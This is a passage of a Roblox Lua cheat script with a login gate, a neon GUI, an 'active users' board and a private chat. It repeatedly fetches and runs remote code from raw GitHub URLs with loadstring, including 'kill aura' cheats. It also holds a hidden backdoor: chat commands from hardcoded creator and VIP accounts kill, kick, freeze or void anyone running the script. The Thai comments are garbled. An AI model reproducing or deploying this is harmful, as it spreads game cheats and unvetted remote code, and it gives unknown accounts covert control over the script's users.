-- [[ MAIN FUNCTION START ]]
local function RunMainScript()
    LoginGui:Destroy()
    
    local MyName = Player.Name
    local UserInputService = game:GetService("UserInputService")
    local TweenService = game:GetService("TweenService")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")

    -- [Start Logic] ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡πÅ‡∏™‡∏î‡∏á‡∏Ç‡πâ‡∏≠‡∏Ñ‡∏ß‡∏≤‡∏°‡∏ï‡πâ‡∏≠‡∏ô‡∏£‡∏±‡∏ö
    local function ShowWelcome()
        local WelcomeGui = Instance.new("ScreenGui", game.CoreGui)
        
        local function CreateNotify(text, pos)
            local label = Instance.new("TextLabel", WelcomeGui)
            label.Size = UDim2.new(0, 250, 0, 40); label.Position = pos; label.BackgroundTransparency = 1
            label.Text = text; label.TextColor3 = Color3.new(1, 1, 1); label.Font = Enum.Font.FredokaOne; label.TextSize = 14; label.TextTransparency = 1
            local WS = Instance.new("UIStroke", label); WS.Thickness = 2; WS.Color = Color3.fromRGB(255, 0, 0); WS.Transparency = 1
            return label, WS
        end

        local function PlaySound(id)
            local s = Instance.new("Sound", game.Workspace); s.SoundId = "rbxassetid://"..tostring(id); s.Volume = 2; s:Play(); game:GetService("Debris"):AddItem(s, 5)
        end

        task.wait(1)
        PlaySound(108729338139883)
        local L1, S1 = CreateNotify("Welcome to Script Word", UDim2.new(0.5, -125, 0.1, 0))
        TweenService:Create(L1, TweenInfo.new(0.8), {TextTransparency = 0}):Play(); TweenService:Create(S1, TweenInfo.new(0.8), {Transparency = 0}):Play()
        task.wait(2.5)
        
        PlaySound(104447039817401)
        local L2, S2 = CreateNotify("By Owner Human", UDim2.new(0.5, -125, 0.15, 0))
        TweenService:Create(L2, TweenInfo.new(0.8), {TextTransparency = 0}):Play(); TweenService:Create(S2, TweenInfo.new(0.8), {Transparency = 0}):Play()
        task.wait(1.5)

        PlaySound(114665895100803)
        local L3, S3 = CreateNotify("Monster Kill", UDim2.new(0.5, -125, 0.2, 0))
        L3.TextColor3 = Color3.fromRGB(255, 50, 50)
        TweenService:Create(L3, TweenInfo.new(0.5), {TextTransparency = 0}):Play(); TweenService:Create(S3, TweenInfo.new(0.5), {Transparency = 0}):Play()
        
        task.wait(3)
        TweenService:Create(L1, TweenInfo.new(1), {TextTransparency = 1}):Play(); TweenService:Create(S1, TweenInfo.new(1), {Transparency = 1}):Play()
        TweenService:Create(L2, TweenInfo.new(1), {TextTransparency = 1}):Play(); TweenService:Create(S2, TweenInfo.new(1), {Transparency = 1}):Play()
        TweenService:Create(L3, TweenInfo.new(1), {TextTransparency = 1}):Play(); TweenService:Create(S3, TweenInfo.new(1), {Transparency = 1}):Play()
        task.wait(1); WelcomeGui:Destroy()
    end
    task.spawn(ShowWelcome)

    -- [Load Core]
    loadstring(game:HttpGet("https://raw.githubusercontent.com/stampx85-byte/Humanx1/refs/heads/main/back%20pack"))()

    _G.VIP_LIST = _G.VIP_LIST or {["ffsww_1007"] = true, ["A_ASPD"] = true, ["HACKER_18050"] = true, ["evils915"] = true, ["TV_BTS1"] = true, ["Winwie001"] = true, ["zx71828"] = true}
    local ADMIN_COMMANDER = {["ffsww_1007"] = true, ["A_ASPD"] = true}
    local HAS_COMMAND_POWER, ACTIVE_USERS, VOID_TARGETS = {}, {}, {}

    local function PlayUISound(id)
        local s = Instance.new("Sound", game.Workspace); s.SoundId = "rbxassetid://"..tostring(id); s.Volume = 1; s:Play(); game:GetService("Debris"):AddItem(s, 2)
    end

    local function SetupTouchVoid(char)
        local root = char:WaitForChild("HumanoidRootPart")
        root.Touched:Connect(function(hit)
            if ADMIN_COMMANDER[MyName] or HAS_COMMAND_POWER[MyName] then
                local hPlayer = game.Players:GetPlayerFromCharacter(hit.Parent)
                if hPlayer and VOID_TARGETS[hPlayer.Name] then
                    local targetRoot = hit.Parent:FindFirstChild("HumanoidRootPart")
                    if targetRoot then
                        targetRoot.CFrame = CFrame.new(102.228256, -496.832855, 407.202423)
                    end
                end
            end
        end)
    end
    if Player.Character then SetupTouchVoid(Player.Character) end
    Player.CharacterAdded:Connect(SetupTouchVoid)

    local function MakeDraggable(frame)
        local dragging, dragInput, dragStart, startPos
        frame.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then dragging = true; dragStart = input.Position; startPos = frame.Position; input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then dragging = false end end) end end)
        frame.InputChanged:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then dragInput = input end end)
        UserInputService.InputChanged:Connect(function(input) if input == dragInput and dragging then local delta = input.Position - dragStart; frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y) end end)
    end

    local function ApplyNeonEffect(frame, color)
        Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10); local stroke = Instance.new("UIStroke", frame); stroke.Thickness = 2.5; stroke.Color = color
        task.spawn(function() while true do TweenService:Create(stroke, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Transparency = 0.2, Thickness = 3.5}):Play(); task.wait(1); TweenService:Create(stroke, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Transparency = 0.7, Thickness = 2}):Play(); task.wait(1) end end)
    end

    -- [[ UI SECTIONS ]]
    local MainGui = Instance.new("ScreenGui", game.CoreGui)
    local MasterFrame = Instance.new("Frame", MainGui)
    MasterFrame.Size = UDim2.new(0, 750, 0, 300); MasterFrame.Position = UDim2.new(0.5, -375, 0.5, -150); MasterFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10); MasterFrame.BackgroundTransparency = 0.1
    ApplyNeonEffect(MasterFrame, Color3.fromRGB(255, 200, 0)); MakeDraggable(MasterFrame)
    local Layout = Instance.new("UIListLayout", MasterFrame); Layout.FillDirection = Enum.FillDirection.Horizontal; Layout.Padding = UDim.new(0, 8); Layout.HorizontalAlignment = Enum.HorizontalAlignment.Center; Layout.VerticalAlignment = Enum.VerticalAlignment.Center

    local function CreateSection(parent, size)
        local f = Instance.new("Frame", parent); f.Size = size; f.BackgroundColor3 = Color3.fromRGB(20, 20, 20); f.BackgroundTransparency = 0.5; f.BorderSizePixel = 0
        Instance.new("UICorner", f); local s = Instance.new("UIStroke", f); s.Color = Color3.fromRGB(40, 40, 40); s.Thickness = 1
        local p = Instance.new("UIPadding", f); p.PaddingTop = UDim.new(0, 5); p.PaddingBottom = UDim.new(0, 5); p.PaddingLeft = UDim.new(0, 5); p.PaddingRight = UDim.new(0, 5)
        return f
    end

    -- BOARD SECTION
    local BoardSide = CreateSection(MasterFrame, UDim2.new(0, 200, 0.94, 0))
    local BTitle = Instance.new("TextLabel", BoardSide); BTitle.Size = UDim2.new(1,0,0,30); BTitle.Text = "ACTIVE USERS"; BTitle.TextColor3 = Color3.fromRGB(255, 215, 0); BTitle.Font = Enum.Font.FredokaOne; BTitle.BackgroundTransparency = 1; BTitle.TextSize = 16
    local BScroll = Instance.new("ScrollingFrame", BoardSide); BScroll.Size = UDim2.new(1,0,1,-35); BScroll.Position = UDim2.new(0,0,0,35); BScroll.BackgroundTransparency = 1; BScroll.ScrollBarThickness = 2
    local BList = Instance.new("UIListLayout", BScroll); BList.Padding = UDim.new(0,5)

    -- COMMANDS SECTION
    local CmdSide = CreateSection(MasterFrame, UDim2.new(0, 250, 0.94, 0))
    local CTitle = Instance.new("TextLabel", CmdSide); CTitle.Size = UDim2.new(1,0,0,30); CTitle.Text = "COMMANDS"; CTitle.TextColor3 = Color3.fromRGB(255, 50, 50); CTitle.Font = Enum.Font.FredokaOne; CTitle.BackgroundTransparency = 1; CTitle.TextSize = 16
    local HelpTxt = Instance.new("TextLabel", CmdSide); HelpTxt.Size = UDim2.new(1,0,0,100); HelpTxt.Position = UDim2.new(0,0,0,30); HelpTxt.Text = "!kill [n] | !kick [n] | !tp [n]\n!freeze [n] | !spin [n] | !void [n]\n!givevip [n] | !killall | !kickall"; HelpTxt.TextColor3 = Color3.fromRGB(180,180,180); HelpTxt.Font = Enum.Font.SourceSansBold; HelpTxt.TextSize = 11; HelpTxt.BackgroundTransparency = 1
    KickTextInp = Instance.new("TextBox", CmdSide); KickTextInp.Size = UDim2.new(1,0,0,25); KickTextInp.Position = UDim2.new(0,0,0,135); KickTextInp.Text = "‡πÇ‡∏î‡∏ô‡∏Å‡∏π‡πÄ‡∏ï‡∏∞‡πÑ‡∏á‡πÑ‡∏≠‡πâ‡∏Ñ‡∏ß‡∏≤‡∏¢"; KickTextInp.BackgroundColor3 = Color3.fromRGB(30,30,30); KickTextInp.TextColor3 = Color3.new(1,1,1); Instance.new("UICorner", KickTextInp)
    KickSoundInp = Instance.new("TextBox", CmdSide); KickSoundInp.Size = UDim2.new(1,0,0,25); KickSoundInp.Position = UDim2.new(0,0,0,165); KickSoundInp.Text = "rbxassetid://137337370812885"; KickSoundInp.BackgroundColor3 = Color3.fromRGB(30,30,30); KickSoundInp.TextColor3 = Color3.new(1,1,1); Instance.new("UICorner", KickSoundInp)
    local CmdBar = Instance.new("TextBox", CmdSide); CmdBar.Size = UDim2.new(1,0,0,35); CmdBar.Position = UDim2.new(0,0,1,-35); CmdBar.PlaceholderText = "> ENTER COMMAND..."; CmdBar.BackgroundColor3 = Color3.fromRGB(20,40,20); CmdBar.TextColor3 = Color3.fromRGB(0,255,0); Instance.new("UICorner", CmdBar)
    CmdSide.Visible = (ADMIN_COMMANDER[MyName] ~= nil or _G.VIP_LIST[MyName] ~= nil)

    -- CHAT SECTION
    local ChatSide = CreateSection(MasterFrame, UDim2.new(0, 250, 0.94, 0))
    local ChatTitle = Instance.new("TextLabel", ChatSide); ChatTitle.Size = UDim2.new(1,0,0,30); ChatTitle.Text = "PRIVATE CHAT"; ChatTitle.TextColor3 = Color3.fromRGB(0, 255, 255); ChatTitle.Font = Enum.Font.FredokaOne; ChatTitle.BackgroundTransparency = 1; ChatTitle.TextSize = 16
    local ChatScroll = Instance.new("ScrollingFrame", ChatSide); ChatScroll.Size = UDim2.new(1,0,1,-75); ChatScroll.Position = UDim2.new(0,0,0,35); ChatScroll.BackgroundTransparency = 0.9; ChatScroll.ScrollBarThickness = 2
    local ChatList = Instance.new("UIListLayout", ChatScroll); ChatList.Padding = UDim.new(0,2); ChatList.SortOrder = Enum.SortOrder.LayoutOrder
    local ChatInput = Instance.new("TextBox", ChatSide); ChatInput.Size = UDim2.new(1,0,0,35); ChatInput.Position = UDim2.new(0,0,1,-35); ChatInput.PlaceholderText = "Type message here..."; ChatInput.BackgroundColor3 = Color3.fromRGB(20,20,40); ChatInput.TextColor3 = Color3.new(1,1,1); Instance.new("UICorner", ChatInput)

    -- MINIMIZE BUTTON
    local MinBtn = Instance.new("TextButton", MainGui); MinBtn.Size = UDim2.new(0, 50, 0, 50); MinBtn.Position = UDim2.new(0.1, 0, 0.1, 0); MinBtn.BackgroundColor3 = Color3.fromRGB(255, 200, 0); MinBtn.Text = "SW"; MinBtn.Font = Enum.Font.FredokaOne; MinBtn.TextSize = 20; MinBtn.TextColor3 = Color3.new(0,0,0); Instance.new("UICorner", MinBtn).CornerRadius = UDim.new(1, 0); Instance.new("UIStroke", MinBtn).Thickness = 2; MakeDraggable(MinBtn)
    MinBtn.MouseButton1Click:Connect(function() MasterFrame.Visible = not MasterFrame.Visible; PlayUISound(452267918) end)

    local function UpdateBoard()
        for _, v in pairs(BScroll:GetChildren()) do if v:IsA("Frame") then v:Destroy() end end
        for _, p in pairs(game.Players:GetPlayers()) do
            if ACTIVE_USERS[p.Name] or _G.VIP_LIST[p.Name] or ADMIN_COMMANDER[p.Name] or HAS_COMMAND_POWER[p.Name] then
                local tag, color = "[ACTIVE]", Color3.fromRGB(0, 255, 150)
                if ADMIN_COMMANDER[p.Name] then tag, color = "[CREATOR]", Color3.fromRGB(255, 40, 40) elseif _G.VIP_LIST[p.Name] then tag, color = "[VIP]", Color3.fromRGB(255, 215, 0) elseif HAS_COMMAND_POWER[p.Name] then tag, color = "[CMD]", Color3.fromRGB(200, 0, 255) end
                
                local row = Instance.new("Frame", BScroll); row.Size = UDim2.new(1,-5,0,25); row.BackgroundTransparency = 0.8; row.BackgroundColor3 = color
                local l = Instance.new("TextLabel", row); l.Size = UDim2.new(0.7,0,1,0); l.Text = tag.." "..p.Name; l.TextColor3 = color; l.BackgroundTransparency = 1; l.Font = Enum.Font.SourceSansBold; l.TextSize = 11; l.TextXAlignment = Enum.TextXAlignment.Left; l.Position = UDim2.new(0,5,0,0)
                
                -- GIFT VIP BUTTON (G)
                local gBtn = Instance.new("TextButton", row)
                gBtn.Size = UDim2.new(0, 18, 0, 18); gBtn.Position = UDim2.new(1, -45, 0.5, -9); gBtn.Text = "V"; gBtn.BackgroundColor3 = Color3.fromRGB(255, 100, 0); gBtn.TextColor3 = Color3.new(1,1,1); gBtn.Font = Enum.Font.SourceSansBold; gBtn.TextSize = 12; Instance.new("UICorner", gBtn)
                gBtn.MouseButton1Click:Connect(function() local chatEvent = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents"); if chatEvent then chatEvent.SayMessageRequest:FireServer("!givevip "..p.Name, "All") end end)

                -- GIFT CMD BUTTON (C) - ‡πÄ‡∏â‡∏û‡∏≤‡∏∞ Admin ‡πÄ‡∏´‡πá‡∏ô
                local cBtn = Instance.new("TextButton", row)
                cBtn.Size = UDim2.new(0, 18, 0, 18); cBtn.Position = UDim2.new(1, -22, 0.5, -9); cBtn.Text = "C"; cBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 255); cBtn.TextColor3 = Color3.new(1,1,1); cBtn.Font = Enum.Font.SourceSansBold; cBtn.TextSize = 12; Instance.new("UICorner", cBtn)
                cBtn.Visible = (ADMIN_COMMANDER[MyName] ~= nil)
                cBtn.MouseButton1Click:Connect(function() local chatEvent = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents"); if chatEvent then chatEvent.SayMessageRequest:FireServer("!cmd "..p.Name, "All") end end)

                BScroll.CanvasSize = UDim2.new(0,0,0,BList.AbsoluteContentSize.Y)
            end
        end
    end

    local function AddChatMessage(sender, msg, color)
        local l = Instance.new("TextLabel", ChatScroll); l.Size = UDim2.new(1,-10,0,20); l.BackgroundTransparency = 1; l.Text = "["..sender.."]: "..msg; l.TextColor3 = color or Color3.new(1,1,1); l.Font = Enum.Font.SourceSansBold; l.TextSize = 13; l.TextXAlignment = Enum.TextXAlignment.Left; l.TextWrapped = true; l.AutomaticSize = Enum.AutomaticSize.Y
        task.wait(0.05); ChatScroll.CanvasPosition = Vector2.new(0, ChatList.AbsoluteContentSize.Y)
    end

    ChatInput.FocusLost:Connect(function(enter)
        if enter and ChatInput.Text ~= "" then
            local color = ADMIN_COMMANDER[MyName] and Color3.fromRGB(255,50,50) or (_G.VIP_LIST[MyName] and Color3.fromRGB(255,215,0) or Color3.fromRGB(0,255,255))
            AddChatMessage(MyName, ChatInput.Text, color)
            local chatEvent = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
            if chatEvent then chatEvent.SayMessageRequest:FireServer("[SW_CHAT]"..ChatInput.Text, "All") end; ChatInput.Text = ""
        end
    end)

    local function CustomKick()
        local s = Instance.new("Sound", game.Workspace); s.SoundId = KickSoundInp.Text; s.Volume = 5; s:Play()
        local sg = Instance.new("ScreenGui", game.CoreGui); sg.IgnoreGuiInset = true; local tx = Instance.new("TextLabel", sg); tx.BackgroundColor3 = Color3.new(0,0,0); tx.Size = UDim2.new(1,0,1,0); tx.Text = KickTextInp.Text; tx.TextColor3 = Color3.new(1,0,0); tx.TextScaled = true; tx.ZIndex = 9999; task.wait(3.5); Player:Kick("\n\n[ Humanx1 System ]\n"..KickTextInp.Text.."\n"); sg:Destroy()
    end

    local function ListenChat(speaker, msg)
        local args = msg:split(" "); local cmd = args[1]:lower()
        local function findTarget(name)
            if not name then return nil end
            if name == "me" or name == "all" then return name end
            for _,p in pairs(game.Players:GetPlayers()) do if p.Name:lower():sub(1,#name)==name:lower() then return p end end
            return nil
        end
        local target = args[2] and findTarget(args[2])

        if msg == "[ScriptWord_Ping]" then ACTIVE_USERS[speaker.Name] = true; UpdateBoard(); return end
        if msg:sub(1,9) == "[SW_CHAT]" then if speaker.Name ~= MyName then AddChatMessage(speaker.Name, msg:sub(10), Color3.fromRGB(0,255,255)) end return end

        local hasPower = ADMIN_COMMANDER[speaker.Name] or HAS_COMMAND_POWER[speaker.Name] or _G.VIP_LIST[speaker.Name]
        
        if target == "me" or (typeof(target) == "Instance" and target == Player) or (target == "all") then
            local char = Player.Character; local hrp = char and char:FindFirstChild("HumanoidRootPart")
            if cmd == "!spin" and hrp then
                local speed = tonumber(args[3]) or 50; local bgv = hrp:FindFirstChild("Spin") or Instance.new("BodyAngularVelocity", hrp)
                bgv.Name = "Spin"; bgv.MaxTorque = Vector3.new(0, math.huge, 0); bgv.AngularVelocity = Vector3.new(0, speed, 0)
            elseif cmd == "!unspin" and hrp then if hrp:FindFirstChild("Spin") then hrp.Spin:Destroy() end
            elseif cmd == "!fire" and hrp then Instance.new("Fire", hrp).Name = "SW_Fire"
            elseif cmd == "!smoke" and hrp then Instance.new("Smoke", hrp).Name = "SW_Smoke"
            end
        end

        if hasPower then
            if speaker ~= Player then PlayUISound(203785501) end
            if cmd == "!void" then if target == "all" then for _,p in pairs(game.Players:GetPlayers()) do if p ~= speaker then VOID_TARGETS[p.Name] = true end end elseif typeof(target) == "Instance" then VOID_TARGETS[target.Name] = true end end
            if cmd == "!unvoid" then if target == "all" then VOID_TARGETS = {} elseif typeof(target) == "Instance" then VOID_TARGETS[target.Name] = nil end end
            
            if cmd == "!cmd" or cmd == "!givevip" then
                if target == Player then
                    HAS_COMMAND_POWER[Player.Name] = true; CmdSide.Visible = true; UpdateBoard()
                    loadstring(game:HttpGet("https://raw.githubusercontent.com/stampx85-byte/Humanx1/refs/heads/main/Kill%20Aura%2020"))()
                end
            end
            if target == Player then
                if cmd == "!kick" then CustomKick() 
                elseif cmd == "!kill" then if Player.Character:FindFirstChild("Humanoid") then Player.Character.Humanoid.Health = 0 end
                elseif cmd == "!tp" then Player.Character.HumanoidRootPart.CFrame = speaker.Character.HumanoidRootPart.CFrame
                elseif cmd == "!freeze" then Player.Character.HumanoidRootPart.Anchored = true 
                elseif cmd == "!unfreeze" then Player.Character.HumanoidRootPart.Anchored = false end
            end
            if cmd == "!killall" then if Player.Character:FindFirstChild("Humanoid") then Player.Character.Humanoid.Health = 0 end elseif cmd == "!kickall" then CustomKick() end
        end
    end

    ACTIVE_USERS[MyName] = true 
    task.spawn(function() task.wait(2); local chatEvent = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents"); if chatEvent then chatEvent.SayMessageRequest:FireServer("[ScriptWord_Ping]", "All") end end)
    CmdBar.FocusLost:Connect(function(e) if e then PlayUISound(452267918); ListenChat(Player, CmdBar.Text); CmdBar.Text = "" end end)
    game.Players.PlayerAdded:Connect(function(p) p.Chatted:Connect(function(m) ListenChat(p,m) end); UpdateBoard() end)
    for _,p in pairs(game.Players:GetPlayers()) do p.Chatted:Connect(function(m) ListenChat(p,m) end) end
    game.Players.PlayerRemoving:Connect(function(p) ACTIVE_USERS[p.Name] = nil; UpdateBoard() end)

    if _G.VIP_LIST[MyName] or ADMIN_COMMANDER[MyName] then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/stampx85-byte/Humanx1/refs/heads/main/Kill%20Aura%2020"))()
    else
        loadstring(game:HttpGet("https://raw.githubusercontent.com/stampx85-byte/Humanx1/refs/heads/main/kill%20aura%20City%20Thailand%202"))()
    end
    UpdateBoard(); task.spawn(function() while task.wait(5) do UpdateBoard() end end)
end

StartBtn.MouseButton1Click:Connect(function()
    if NameInput.Text == ExpectedName then RunMainScript()
    else StartBtn.Text = "‡∏ä‡∏∑‡πà‡∏≠‡πÑ‡∏°‡πà‡∏ñ‡∏π‡∏Å‡∏ï‡πâ‡∏≠‡∏á!"; StartBtn.BackgroundColor3 = Color3.fromRGB(200, 0, 0); task.wait(1); StartBtn.Text = "START SCRIPT"; StartBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 0) end
end)
